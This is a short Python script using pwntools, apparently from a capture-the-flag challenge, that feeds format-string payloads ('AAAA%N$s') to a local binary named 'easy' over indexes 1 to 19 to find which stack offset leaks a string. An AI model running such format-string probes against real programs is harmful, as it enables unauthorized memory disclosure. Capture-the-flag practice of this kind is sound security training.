#!/usr/bin/env python3
from pwn import *

context.log_level = 'error'

for i in range(1,20):
    p = process("./easy")
    p.sendline("AAAA%{}$s".format(i))
    try:
        print("Index: {} - {}".format(i, p.recvall(timeout=0.1).strip(b'Enter Username:\n')
            .strip(b"A\n").strip(b"Nice try hahahahah\n").decode("utf-8")))
    except:
        pass